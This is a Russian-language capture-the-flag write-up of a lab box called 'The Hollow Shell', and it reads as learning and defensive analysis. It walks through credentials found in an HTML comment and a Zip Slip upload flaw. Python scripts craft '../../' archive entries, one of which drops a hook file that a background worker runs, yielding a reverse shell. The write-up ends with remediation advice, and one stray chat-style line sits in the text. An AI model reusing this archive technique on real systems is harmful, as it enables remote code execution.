# The Hollow Shell

## 1. Общая информация

**Target:** The Hollow Shell

В ходе исследования был получен авторизованный доступ к web-приложению, после чего была исследована функциональность загрузки ZIP-архивов. В результате удалось обнаружить уязвимость Zip Slip, позволившую записывать произвольные файлы за пределами директории загруженного shell.

После самостоятельного определения директории `hooks/` удалось записать туда Python-файл и получить reverse shell.

# 2. Reconnaissance

Первоначально был выполнен Nmap-скан:

```text
22/tcp    SSH
5000/tcp  HTTP — Gunicorn
```

Основным объектом дальнейшего исследования стало web-приложение на:

```text
http://10.114.146.129:5000
```

Web-сервер:

```text
Gunicorn
```


# 3. Получение первоначального доступа

При обращении к главной странице приложения происходил редирект на:

```text
/login
```

При анализе исходного HTML был обнаружен внутренний комментарий:

```text
───────────────────────────────────────────────────────────────
Byte Lotus // internal display-manager portal
New on the floor team? IT seeds every property with the same
starter login until you set your own:
user: concierge
pass: StayNoticed2024!
(rotate it from Settings on first sign-in — most people forget)
───────────────────────────────────────────────────────────────
```

Были обнаружены credentials:

```text
Username: concierge
Password: StayNoticed2024!
```

Credentials оказались рабочими.

После успешной авторизации происходил редирект:

```text
/login
   ↓
/dashboard
```


# 4. Анализ Dashboard

На `/dashboard` была обнаружена функциональность загрузки shell.

Интерфейс указывал, что shell представляет собой ZIP-архив.

В архиве должен находиться:

```text
shell.json
```

Согласно интерфейсу, допустимыми asset types являлись:

```text
png
jpg
gif
svg
css
json
```

После загрузки сервер возвращал сообщение:

```text
Shell 'test' brought ashore. Stored at shells/1474dbbf28a9/ and held to the room's ear.
```

Однако прямой просмотр:

```text
/shells/1474dbbf28a9/
```

не показывал содержимое.


# 5. Endpoint Enumeration

Для поиска дополнительных endpoints был выполнен directory fuzzing.

Были обнаружены:

```text
dashboard    200
login        200
logout       302 → /login
upload       405
```

Endpoint:

```text
/upload
```

существовал, однако при обращении неподходящим HTTP method возвращал:

```text
405 METHOD NOT ALLOWED
```

Дополнительная проверка HTTP methods показала, что загрузка осуществляется через:

```text
POST
```


# 6. Анализ session cookie

После авторизации приложение выдавало cookie:

```text
eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.anfuqA.WIziA3VkCO0LJSAlPypybGxZz5E
```

Первая часть cookie после декодирования содержала:

```json
{
  "staff": "concierge"
}
```

Структура cookie отличалась от классического JWT.

Были проведены попытки модификации cookie.

## 6.1. Подмена пользователя

Исходное значение:

```json
{
  "staff": "concierge"
}
```

заменялось на:

```json
{
  "staff": "attendant"
}
```

Простая подмена не сработала, поскольку сервер проверял подпись.

## 6.2. `alg:none`

Была проверена возможность использования:

```text
alg: none
```

Результат:

```text
Не сработало.
```

## 6.3. Algorithm confusion

Также была проверена атака со смешением алгоритмов с использованием:

```text
HS256
```

Результат:

```text
Не сработало.
```

Таким образом, эксплуатация session cookie не дала первоначального доступа за пределами имеющейся учётной записи.


# 7. Исследование Shell Upload

На странице загрузки было обнаружено описание:

```text
A shell may include optional automation hooks — the theme worker
applies these for you shortly after the shell comes ashore, so
you don't have to touch each tablet by hand.
```

Данная информация указывала на существование некоторого background-механизма обработки shell.

На этом этапе предполагалось, что загруженные assets могут дополнительно обрабатываться серверной частью.


# 8. Исследование shell.json

Проводилась работа с manifest-файлом.

Пример:

```json
{
  "name": "test1",
  "assets": [
    "shell.css"
  ]
}
```

Была предпринята попытка использовать CSS:

```css
body {
    background-image: url("http://192.168.130.144:8000/css-test");
}
```

Целью было определить, осуществляется ли серверное обращение к указанному ресурсу.

Callback на контролируемый сервер не поступил.


# 9. Исследование SVG

Следующим направлением был SVG.

SVG успешно загружался и становился доступен по URL:

```text
/shells/0505d95fbad0/shell.svg
```

Таким образом было подтверждено, что загруженные assets действительно доступны через web-сервер.

При этом SVG обрабатывался непосредственно браузером.

Server-side callback от предполагаемого worker обнаружен не был.

Следовательно, данный вектор не привёл к server-side code execution.


# 10. Попытка эксплуатации PHP

Была предпринята попытка загрузки PHP-файлов.

Дополнительно проверялся вариант с двойным расширением:

```text
shell.php.png
```

Файл:

```text
/shells/d2f2ae34e4a7/shell.php.png
```

успешно загружался.

Однако при обращении к нему сервер возвращал содержимое файла как статический ресурс.

Это показало, что PHP-файлы в данном HTTP-контексте не интерпретируются.


# 11. Дополнительные payload и insecure deserialization

Были протестированы различные варианты файлов:

```text
.css
.svg
.png
.json
```

При этом обращений со стороны предполагаемого theme worker обнаружено не было.

Также исследовалась возможность эксплуатации:

```text
insecure deserialization
```

с использованием pickle.

Данный вектор результата не дал.


# 12. Обнаружение Zip Slip

Следующим этапом было исследование непосредственно механизма обработки ZIP-архивов.

Было обнаружено, что имена файлов внутри ZIP могут содержать traversal:

```text
../
../../
```

без корректного ограничения конечного пути.

Для проверки был создан архив:

```python
import zipfile

with zipfile.ZipFile("zipslip2.zip", "w") as z:
    z.writestr(
        "shell.json",
        '{"name":"zipslip-test","assets":["marker.png"]}'
    )
    z.writestr(
        "../../static/marker.txt",
        "ZIPSLIP_TEST_456"
    )
```

После загрузки файл оказался доступен через:

```text
/static/marker.txt
```

Например:

```text
http://10.114.146.129:5000/static/marker.txt
```

Содержимое файла:

```text
ZIPSLIP_TEST_456
```

Таким образом была подтверждена уязвимость:

```text
ZIP Slip
    ↓
Path Traversal
    ↓
Arbitrary File Write
```


# 13. Определение директории hooks и эксплуатация

После подтверждения arbitrary file write следующим этапом стало определение директории, в которую можно записать файл таким образом, чтобы он был обработан сервером.


Путём дальнейшего исследования структуры приложения была самостоятельно определена директория:

```text
hooks/
```

После этого был сформирован ZIP, содержащий traversal-path:

```text
../../hooks/shell.py
```

Например:

```python
import json
import zipfile

with zipfile.ZipFile("zipslip2.zip", "w") as z:
    z.writestr(
        "shell.json",
        '{"name":"zipslip-test","assets":[]}'
    )

    z.writestr(
        "../../hooks/shell.py",
        "<Python code>"
    )
```

Ключевой момент:

```text
../../hooks/shell.py
```

позволил записать контролируемый Python-файл непосредственно в `hooks/`.

После загрузки архива и обработки файла удалось получить **reverse shell**.


# 14. Пост-эксплуатационный анализ Theme Worker

Уже **после получения reverse shell** был найден исходный код:

```text
theme_worker.py
```

Данное обнаружение позволило подтвердить механизм, благодаря которому размещённый Python-файл выполнялся.

Исходный код:

```python
#!/usr/bin/env python3
import os
import sys
import glob
import time
import subprocess

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
HOOKS_DIR = os.path.join(BASE_DIR, "hooks")
POLL_SECONDS = int(os.environ.get("THEME_WORKER_POLL", "20"))

os.makedirs(HOOKS_DIR, exist_ok=True)

def run_pending_hooks():
    for path in sorted(glob.glob(os.path.join(HOOKS_DIR, "*.py"))):
        try:
            with open(path, "rb") as fh:
                code = fh.read()
        except OSError:
            continue

        try:
            os.remove(path)
        except OSError:
            pass

        try:
            proc = subprocess.Popen(
                [sys.executable, "-"],
                stdin=subprocess.PIPE,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            proc.stdin.write(code)
            proc.stdin.close()
        except Exception:
            pass

def main():
    while True:
        run_pending_hooks()
        time.sleep(POLL_SECONDS)

if __name__ == "__main__":
    main()
```


# 15. Анализ Theme Worker

Исходный код подтвердил ранее обнаруженное поведение.

Worker определяет:

```python
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
HOOKS_DIR = os.path.join(BASE_DIR, "hooks")
```

Таким образом, директория:

```text
hooks/
```

является штатной директорией для обработки automation hooks.

Worker с интервалом:

```text
20 секунд
```

выполняет:

```python
glob.glob(os.path.join(HOOKS_DIR, "*.py"))
```

То есть ищет Python-файлы в:

```text
hooks/*.py
```

После обнаружения файла worker:

### 15.1. Читает файл

```python
with open(path, "rb") as fh:
    code = fh.read()
```

### 15.2. Удаляет его

```python
os.remove(path)
```

Файл удаляется **до выполнения**.

### 15.3. Запускает Python interpreter

```python
subprocess.Popen(
    [sys.executable, "-"],
    stdin=subprocess.PIPE,
    ...
)
```

После чего содержимое найденного файла передаётся через stdin:

```python
proc.stdin.write(code)
```

Таким образом, фактически worker выполняет содержимое `.py` через отдельный Python interpreter.

Это пост-эксплуатационное исследование подтвердило, почему ранее записанный через Zip Slip Python-файл привёл к выполнению кода.


# 16. Итоговая эксплуатационная цепочка

Фактическая хронология исследования:

```text
1. Nmap
   ↓
2. Обнаружение web application
   ↓
3. Hardcoded credentials
   ↓
4. concierge login
   ↓
5. Dashboard
   ↓
6. ZIP upload functionality
   ↓
7. Исследование assets / SVG / CSS / PHP / pickle
   ↓
8. Обнаружение ZIP Slip
   ↓
9. Подтверждение arbitrary file write через /static/marker.txt
   ↓
10. Самостоятельное определение hooks/
   ↓
11. Запись Python-файла через ../../hooks/*.py
   ↓
12. Получение reverse shell
   ↓
13. Пост-эксплуатационный поиск theme_worker.py
   ↓
14. Подтверждение механизма Python hook execution
```

Таким образом, **`theme_worker.py` не использовался для обнаружения `hooks/` или построения первоначальной эксплуатации**. Он был найден уже после получения shell и использован для анализа и подтверждения механизма эксплуатации.


# 17. Root Cause

Компрометация стала возможной вследствие комбинации нескольких проблем.

## 17.1. Hardcoded credentials

Рабочие credentials находились непосредственно в исходном HTML:

```text
concierge / StayNoticed2024!
```

Это позволило получить авторизованный доступ.

## 17.2. Небезопасная обработка ZIP

Приложение не ограничивало путь, указанный в имени ZIP-entry.

Использование:

```text
../../
```

позволило выйти за пределы intended extraction directory.

## 17.3. Arbitrary File Write

Zip Slip предоставил возможность контролировать:

```text
filename
+
file contents
```

и записывать их в произвольное доступное место файловой системы.

## 17.4. Доверие к содержимому hooks

Директория:

```text
hooks/
```

использовалась worker-ом как источник Python-кода.

При этом worker не проверял:

* источник файла;
* подпись;
* владельца;
* целостность;
* допустимость содержимого;
* происхождение hook.

В результате возможность записи `.py` в `hooks/` непосредственно приводила к выполнению произвольного Python-кода.


# 18. Impact

Атакующий с валидными credentials мог:

1. получить доступ к dashboard;
2. загрузить специально сформированный ZIP;
3. использовать Zip Slip;
4. записать произвольный файл за пределами директории shell;
5. разместить Python-код в `hooks/`;
6. дождаться обработки файла worker-ом;
7. добиться выполнения произвольного Python-кода;
8. получить reverse shell с правами пользователя, под которым работает worker.


# 19. Рекомендации

## 19.1. Исправить ZIP Slip

При распаковке каждого entry необходимо:

* нормализовать путь;
* получить canonical/real path;
* проверить, что итоговый путь находится внутри extraction directory;
* запрещать `../`;
* запрещать абсолютные пути;

## 19.2. Не выполнять пользовательские `.py`

Наиболее критичная архитектурная проблема:

```text
user-controlled ZIP
        ↓
hooks/*.py
        ↓
python interpreter
```

Пользовательские shell-архивы не должны иметь возможности поставлять произвольный исполняемый Python-код.


## 19.3. Если hooks необходимы

Необходимо использовать:

* строгую allowlist операций;
* подпись hooks;
* проверку происхождения;
* отдельного unprivileged пользователя;
* sandbox;
* ограничения filesystem access;
* ограничения network access;
* resource limits.

## 19.4. Удалить hardcoded credentials

Credentials:

```text
concierge / StayNoticed2024!
```

не должны присутствовать в client-side HTML.

Первоначальный пароль должен быть уникальным для каждой установки либо генерироваться случайно.

Также необходимо принудительно менять временные credentials при первом входе.

Понял. Тогда в конце лучше сделать короткий блок именно как **личный итог**, без повторения всего отчёта.

# Личный итог

Главное достижение в этой машине — **первая самостоятельная эксплуатация ZIP Slip**.

До этого я сталкивался с Zip Slip теоретически, но в рамках **The Hollow Shell** впервые самостоятельно прошёл весь путь от обнаружения уязвимости до практической эксплуатации.

Особенно полезным оказался сам процесс поиска: недостаточно было просто обнаружить возможность записать файл через `../`. Нужно было понять, **куда именно записать файл, чтобы он был обработан приложением**.

В результате я самостоятельно определил рабочую директорию `hooks/`, записал туда Python hook и получил reverse shell.

Отдельно полезным опытом стало понимание того, что файл не обязан быть доступен через HTTP для того, чтобы быть выполненным. `theme_worker` работал непосредственно с файловой системой, поэтому `/hooks/shell.py` возвращал `404`, хотя сам файл существовал и успешно обрабатывался worker'ом.

**Итог: это был первый практический опыт эксплуатации ZIP Slip с переходом от Arbitrary File Write к Remote Code Execution.**
